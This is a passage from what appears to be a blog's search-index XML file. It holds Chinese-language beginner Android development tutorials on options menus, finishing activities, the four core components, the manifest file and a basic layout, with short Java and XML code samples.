       <span class="attr">android:title</span>=<span class="string">&quot;Remove&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">menu</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在FirrstActivity中添加事件（可用<code>Ctrl+O</code>）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">    getMenuInflater().inflate(R.menu.main,menu);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.onCreateOptionsMenu(menu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>getMenuInflater()</code>方法可以的到MenuInflater对象，再调用其中的inflate()方法就可以创建菜单，传入两个参数，一个是资源文件R.menu.main，一个是添加到哪个Menu对象。</p><p>菜单响应事件代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(<span class="meta">@NonNull</span> MenuItem item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (item.getItemId())&#123;</span><br><span class="line">        <span class="keyword">case</span> R.id.add_item:</span><br><span class="line">            Toast.makeText(FirstActivity.<span class="keyword">this</span>,<span class="string">&quot;you clicked Add&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> R.id.remove_item:</span><br><span class="line">            Toast.makeText(FirstActivity.<span class="keyword">this</span>,<span class="string">&quot;you clicked remove&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>item.getItemId()</code>来判断点击的是哪一个菜单项，然后加入每个菜单应该执行的逻辑功能。</p><h1 id="销毁一个活动"><a href="#销毁一个活动" class="headerlink" title="销毁一个活动"></a>销毁一个活动</h1><p>在Aactivity中调用一个finish();即可完成一次销毁。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(FirstActivity.<span class="keyword">this</span>,<span class="string">&quot;hello world&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android开发-2</title>
      <link href="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/"/>
      <url>/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/</url>
      
        <content type="html"><![CDATA[<h1 id="UI设计相关的概念"><a href="#UI设计相关的概念" class="headerlink" title="UI设计相关的概念"></a>UI设计相关的概念</h1><p><strong>view</strong></p><p>view类位于Android.view包中；View类的子类一般位于Android.widget包中</p><p>常用属性</p><p><img src="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/image-20200920185915602.png" class="lazyload" data-srcset="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/image-20200920185915602.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920185915602"></p><p><strong>ViewGroup</strong>(继承view类，抽象类)</p><p>ViewGroup.LayoutParams类<img src="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/image-20200920190226041.png" class="lazyload" data-srcset="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/image-20200920190226041.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920190226041"></p><p>ViewGroup.MarginLayoutParams类</p><p><img src="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/image-20200920190403011.png" class="lazyload" data-srcset="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/image-20200920190403011.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920190403011"></p><p><strong>Android  UI组件的层次结构</strong></p><p><img src="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/image-20200920190633756.png" class="lazyload" data-srcset="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/image-20200920190633756.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920190633756"></p><h1 id="控制UI界面"><a href="#控制UI界面" class="headerlink" title="控制UI界面"></a>控制UI界面</h1><p><img src="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/image-20200920190737951.png" class="lazyload" data-srcset="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/image-20200920190737951.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920190737951"></p><p><img src="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/image-20200920190935742.png" class="lazyload" data-srcset="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/image-20200920190935742.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920190935742"></p><p><img src="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/image-20200920191016862.png" class="lazyload" data-srcset="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/image-20200920191016862.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920191016862"></p><p><strong>Ⅰ、例子（用xml设置背景图片）</strong></p><p>1.将图片移至此路径下：<img src="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/image-20200920192330200.png" class="lazyload" data-srcset="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/image-20200920192330200.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920192330200"></p><p>2.修改该activity中的代码<img src="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/image-20200920192405058.png" class="lazyload" data-srcset="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/image-20200920192405058.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920192405058"></p><p>其中固定格式为@mipmap为此路径下的图片</p><p>3.效果<img src="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/image-20200920192450328.png" class="lazyload" data-srcset="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/image-20200920192450328.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920192450328"></p><p><strong>Ⅱ、用纯java代码去写一个UI界面</strong></p><h1 id="布局管理器"><a href="#布局管理器" class="headerlink" title="布局管理器"></a>布局管理器</h1>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android开发-1</title>
      <link href="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/"/>
      <url>/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/</url>
      
        <content type="html"><![CDATA[<p><a href="http://c.biancheng.net/android/">Android</a> 作为一个移动设备的开发平台，其软件层次结构包含操作系统 (OS)、中间件 (MiddleWare) 和应用程序 (Application)。</p><p>Android 的应用程序通常涉及用户界面和用户交互，这类程序是用户实实在在能感受到的。目前 Android 本身提供了桌面、联系人、电话和浏览器等众多的核心应用，同时还允许开发者使用应用程序框架层的 API 实现自己的程序</p><p>Android 系统没有使用常见的应用程序入口点的方法（例如C语言中的 main() 方法），应用程序是由组件组成的，组件可以调用相互独立的基本功能模块。根据完成的功能不同，Android 划分了 4 类核心组件，即 Activity、Service、BroadcastReceiver 和 ContentProvider，各组件之间的消息传递通过 Intent 完成。</p><h1 id="Activity（窗口）"><a href="#Activity（窗口）" class="headerlink" title="Activity（窗口）"></a>Activity（窗口）</h1><p>Activity 是 Android 应用程序核心组件中最基本的一种，是用户和应用程序交互的窗口。</p><p>在 Android 应用程序中，一个 Activity 通常对应一个单独的视图。一个 Android 应用程序是由一个或多个 Activity 组成的，这些 Activity 相当于 Web 应用程序中的网页，用于显示信息，并且相互之间可以进行跳转。和网页跳转不同的是，Activity 之间的跳转可以有返回值。</p><p>新打开一个视图时，之前的那个视图会被置为暂停状态，并且压入<strong>历史堆栈</strong>中，用户可以通过回退操作返回以前打开过的视图。Activity 是由 Android 系统进行维护的，它有自己的生命周期，即“产生、运行、销毁”，但是在这个过程中会调用许多方法，如创建 onCreate()、激活 onStart()、恢复 onResume()、暂停 onPause()、停止 onStop()、销毁 onDestroy()和重启 onRestart() 等。</p><h2 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h2><p>Service 是一种类似于 Activity 但是没有视图的程序，它没有用户界面，可以在后台运行很长时间，相当于操作系统中的一个服务。</p><p>Android 定义了两种类型的 Service，即<strong>本地 Service</strong> 和<strong>远程 Service</strong>。本地 Service 是只能由承载该 Service 的应用程序访问的组件，而远程 Service 是供在设备上运行的其他应用程序远程访问的 Service。</p><p>通过 Context.startService(Intent service) 可以启动一个 Service，通过 Context. bindService() 可以绑定一个 Service。</p><h2 id="BroadcastReceiver"><a href="#BroadcastReceiver" class="headerlink" title="BroadcastReceiver"></a>BroadcastReceiver</h2><p>BroadcastReceiver 的意思是“广播接收者”，顾名思义，它用来接收来自系统和其他应用程序的广播，并做出回应。</p><p>在 Android 系统中，当有特定事件发生时就会产生相应的广播。广播体现在方方面面。例如，当开机过程完成后，系统会产生一条广播，接收到这条广播就能实现开机启动服务的功能；当网络状态改变时，系统会产生一条广播，接收到这条广播就能及时地做出提示和保存数据等操作；当电池电量改变时，系统会产生一条广播，接收到这条广播就能在电量低时告知用户及时保存进度等。</p><p>BroadcastReceiver 不能生成 UI，通过 NotificationManager 来通知用户有事件发生，对于用户来说是隐式的。</p><p>BroadcastReceiver 的 2 种注册方式：</p><ul><li>在 AndroidManifest. xml 中进行静态注册；</li><li>在运行时的代码中使用 Context.registerReceiver() 进行动态注册。</li></ul><p>只要注册了 BroadcastReceiver，即使对应的事件广播来临时应用程序并未启动，系统也会自动启动该应用程序对事件进行处理。另外，用户还可以通过 Context.sendBroadcast() 将自己的 Intent 对象广播给其他的应用程序。</p><h2 id="ContentProvider"><a href="#ContentProvider" class="headerlink" title="ContentProvider"></a>ContentProvider</h2><p>文件、数据库等数据在 Android 系统内是私有的，仅允许被特定应用程序直接使用。在两个程序之间，数据的交换或共享由 ContentProvider 实现。</p><p>ContentProvider 类实现了一组标准方法的接口，从而能够让其他的应用保存或读取 ContentProvider 提供的各种数据类型。</p><h2 id="Intent"><a href="#Intent" class="headerlink" title="Intent"></a>Intent</h2><p>Intent 并不是 Android 应用程序四大核心组件之一，但是其重要性无可替代，因此在这里我们做一下简单介绍。</p><p><strong>Android 应用程序核心组件中的三大核心组件 —— Activity、Service、BroadcastReceiver</strong>。通过消息机制被启动激活，而所使用的消息就是 Intent。Intent 是对即将要进行的操作的抽象描述，承担了 Android 应用程序三大核心组件相互之间的通信功能。</p><h3 id="1-创建一个空的项目"><a href="#1-创建一个空的项目" class="headerlink" title="1.创建一个空的项目"></a>1.创建一个空的项目</h3><p>项目结构(Android选项下)：<img src="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/image-20200920161845265.png" class="lazyload" data-srcset="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/image-20200920161845265.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920161845265"></p><h3 id="2-主要的XML文件"><a href="#2-主要的XML文件" class="headerlink" title="2.主要的XML文件"></a>2.主要的XML文件</h3><p><img src="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/image-20200920162412574.png" class="lazyload" data-srcset="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/image-20200920162412574.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920162412574"></p><p>整个Android项目的配置文件，在程序中定义的四大组件都需在这个文件里注册，另外还可以在这个文件中给应用程序添加声明</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.example.android&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        &lt;!<span class="attr">-</span>应用图标<span class="attr">-</span>&gt;</span></span><br><span class="line">        android:icon=&quot;@mipmap/ic_launcher&quot;</span><br><span class="line">     &lt;!-应用名称-&gt;</span><br><span class="line">        android:label=&quot;@string/app_name&quot;</span><br><span class="line">        android:roundIcon=&quot;@mipmap/ic_launcher_round&quot;</span><br><span class="line">        android:supportsRtl=&quot;true&quot;</span><br><span class="line">        android:theme=&quot;@style/AppTheme&quot;&gt;</span><br><span class="line">        &lt;!-activity设置为窗口-&gt;</span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                &lt;!-将MAINActivity设置为启动窗口-&gt;</span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        &lt;!-这段代码表示对MainACtivity这个窗口/活动进行注册，没有在AndroidManifest.xml里注册的窗口/活动是不能使用的。其中intent-filter里的两行代码很重要<span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span> <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span>表示MainActivity是这个项目的主窗口 -&gt;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-主要的Java文件"><a href="#3-主要的Java文件" class="headerlink" title="3.主要的Java文件"></a>3.主要的Java文件</h3><p><img src="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/image-20200920162517895.png" class="lazyload" data-srcset="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/image-20200920162517895.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920162517895"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.android;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="comment">//定义一个java类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="comment">//显示的布局文件</span></span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-res-drawable目录"><a href="#4-res-drawable目录" class="headerlink" title="4.res-drawable目录"></a>4.res-drawable目录</h3><p><img src="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/image-20200920162840185.png" class="lazyload" data-srcset="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/image-20200920162840185.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="><img src="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/image-20200920195124586.png" class="lazyload" data-srcset="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/image-20200920195124586.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920195124586"></p><p><img src="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/image-20200920162908932.png" class="lazyload" data-srcset="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/image-20200920162908932.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920162908932"></p><h3 id="5-res-layout目录"><a href="#5-res-layout目录" class="headerlink" title="5.res-layout目录"></a>5.res-layout目录</h3><p>显示布局文件</p><p><img src="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/image-20200920163058716.png" class="lazyload" data-srcset="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/image-20200920163058716.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920163058716"></p><p><img src="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/image-20200920163107389.png" class="lazyload" data-srcset="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/image-20200920163107389.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920163107389"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; 代码?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;Hello World!&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintLeft_toLeftOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintRight_toRightOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">&quot;parent&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="6-values目录"><a href="#6-values目录" class="headerlink" title="6.values目录"></a><strong>6.values目录</strong></h3><p><img src="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/image-20200920195255489.png" class="lazyload" data-srcset="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/image-20200920195255489.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920195255489"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;app_name&quot;</span>&gt;</span>第一个Android应用<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 